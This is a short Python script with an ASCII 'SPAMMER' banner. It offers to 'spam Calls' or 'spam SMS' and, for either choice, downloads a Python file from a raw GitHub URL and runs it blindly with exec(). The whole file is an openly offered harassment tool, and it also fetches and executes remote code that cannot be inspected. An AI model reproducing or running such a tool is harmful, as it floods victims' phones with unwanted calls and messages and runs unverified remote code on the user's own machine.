import requests

def menu():
    print('''
==================================================================
= ███████╗██████╗  █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗  =
= ██╔════╝██╔══██╗██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗ =
= ███████╗██████╔╝███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝ =
= ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗ =
= ███████║██║     ██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║ =
= ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ =
==================================================================

                Dev By Ghalwash User : @Mrfa0gh
    ''')
    choice = input("        Choose an option (1 spam  Calls or 2 spam SMS): =>> ")
    return choice

def run_script_from_url(url):
    # Get the script content from the URL
    response = requests.get(url)
    
    # Execute the script
    if response.status_code == 200:
        exec(response.text)
    else:
        print(f"Failed to load script from {url}. HTTP Status Code: {response.status_code}")

if __name__ == "__main__":
    user_choice = menu()
    
    if user_choice == '1':
        run_script_from_url('https://raw.githubusercontent.com/faresMshams/faresMshams/main/calls.py')
    elif user_choice == '2':
        run_script_from_url('https://raw.githubusercontent.com/faresMshams/faresMshams/main/sms.py')
    else:
        print("Invalid choice. Please select 1 or 2.")
